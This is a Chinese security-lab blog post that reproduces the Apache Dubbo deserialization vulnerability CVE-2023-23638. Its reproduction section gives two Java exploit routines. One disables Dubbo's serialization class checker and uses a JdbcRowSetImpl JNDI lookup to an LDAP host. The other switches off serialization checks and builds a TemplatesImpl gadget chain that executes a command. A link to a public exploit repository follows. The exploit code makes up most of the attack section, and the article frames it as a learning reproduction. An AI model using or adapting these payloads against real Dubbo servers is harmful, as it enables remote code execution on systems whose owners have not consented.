<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3Y2GbHassprtewAsbAN__A)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**

Apache Dubbo 是一款高性能的 Java RPC 框架。其前身是阿里巴巴公司开源的、轻量级的开源 Java RPC 框架，可以和 Spring 框架无缝集成， 2018 年阿里巴巴把这个框架捐献给了 apache 基金会。

Apache Dubbo 是美国阿帕奇（Apache）基金会的一款基于 Java 的轻量级 RPC（远程过程调用）框架。该产品提供了基于接口的远程呼叫、容错和负载平衡以及自动服务注册和发现等功能。

Dubbo 2.7.21 版本及之前的 2.7.x 版本、3.0.13 版本及之前的 3.0.x 版本、3.1.5 版本及之前的 3.1.x 版本存在代码问题漏洞，该漏洞源于存在反序列化漏洞，可能导致恶意代码执行。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

Apache Dubbo 2.7.x <= 2.7.21 

3.0.0 <= Apache Dubbo <= 3.0.13 

3.1.0 <= Apache Dubbo <= 3.1.5

**注：利用难度大，需知道接口全限定名、方法名、入参及返参类型等。**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBamDzYViabZvUGnZBlguicaS9xK5sWhYicQARcPMtKtkibeiaGbs9ncribg0maCHvDHMCPuXF4QzZatPeA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 识别漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBamDzYViabZvUGnZBlguicaSHryXrV5siattHPAKbgQyp6qicwfSKcpWmxR2ro8NQjcgVSOiaxgxVLFTA/640?wx_fmt=png)

2. 对漏洞进行复现

有两种利用方式核心代码  

方式 1  

```
private static Map getInstance() throws IOException {
    HashMap newChecker = new HashMap();
    newChecker.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
    newChecker.put("OPEN_CHECK_CLASS", false);
    HashMap map = new HashMap();
    map.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
    map.put("INSTANCE", newChecker);
    LinkedHashMap map2 = new LinkedHashMap();
    map2.put("class", "com.sun.rowset.JdbcRowSetImpl");
    map2.put("DataSourceName", "ldap://127.0.0.1:1099/exp");
    map2.put("autoCommit", true);
    HashMap map3 = new HashMap();
    map3.put("class","java.util.HashMap");
    map3.put("1",map);
    map3.put("2",map2);
    return map3;
}

```

方式 2  

```
public static Map getProperties() throws IOException {
    Properties properties = new Properties();
    properties.setProperty("dubbo.security.serialize.generic.native-java-enable","true");
    properties.setProperty("serialization.security.check","false");
    HashMap map = new HashMap();
    map.put("class", "java.lang.System");
    map.put("properties", properties);
    return map;
}
public static Object getObject() throws Exception{
    ClassPool pool = ClassPool.getDefault();
    CtClass clazz = pool.makeClass("a");
    CtClass superClass = pool.get(AbstractTranslet.class.getName());
    clazz.setSuperclass(superClass);
    CtConstructor constructor = new CtConstructor(new CtClass[]{},
            clazz);
    constructor.setBody("Runtime.getRuntime().exec(\"calc.exe\");");
    clazz.addConstructor(constructor);
    byte[][] bytes = new byte[][]{clazz.toBytecode()};
    TemplatesImpl templates = TemplatesImpl.class.newInstance();
    setValue(templates, "_bytecodes", bytes);
    setValue(templates, "_name", "test");
    setValue(templates, "_tfactory", null);
    JSONArray jsonArray = new JSONArray();
    jsonArray.add(templates);
    BadAttributeValueExpException val = new
            BadAttributeValueExpException(null);
    Field valfield = val.getClass().getDeclaredField("val");
    valfield.setAccessible(true);
    valfield.set(val, jsonArray);
    NativeJavaSerialization nativeJavaSerialization =new NativeJavaSerialization();
    UnsafeByteArrayOutputStream unsafeByteArrayOutputStream = new UnsafeByteArrayOutputStream();
    ObjectOutput o = nativeJavaSerialization.serialize(null,unsafeByteArrayOutputStream);
    o.writeObject(val);
    return unsafeByteArrayOutputStream.toByteArray();
}
send(getProperties());
send(getObject());

```

利用过程流量

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBamDzYViabZvUGnZBlguicaSeb207sCp1Ws1WS7MmRGMDmReW15ZebjntBLvib9m7jMCXxym7lzIeWg/640?wx_fmt=png)

3. 工具测试（漏洞存在）

在 Dubbo3.x 中，启动服务时会隐式的启动一个 **org.apache.dubbo.metadata.MetadataService** 服务，这个服务的作用是保存 Dubbo 的服务的元数据。

注入服务  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBamDzYViabZvUGnZBlguicaS08GCFiaOfxuPbib5RMRp2Brh7EOlJ1j632gQ6I9yneicAaac4gofBNiawg/640?wx_fmt=png)

命令执行成功（**成功执行概率很低**）

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBamDzYViabZvUGnZBlguicaSk3uf1MjvdibDt3BWArwBXekhybTY8rA9VDMNF7xRQIAufBeXiaibD3kZQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://lists.apache.org/thread/8h6zscfzj482z512d2v5ft63hdhzm0cb
https://exp10it.cn/2023/03/apache-dubbo-cve-2023-23638-%E5%88%86%E6%9E%90/
https://forum.butian.net/share/2277
https://github.com/YYHYlh/Apache-Dubbo-CVE-2023-23638-exp/

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)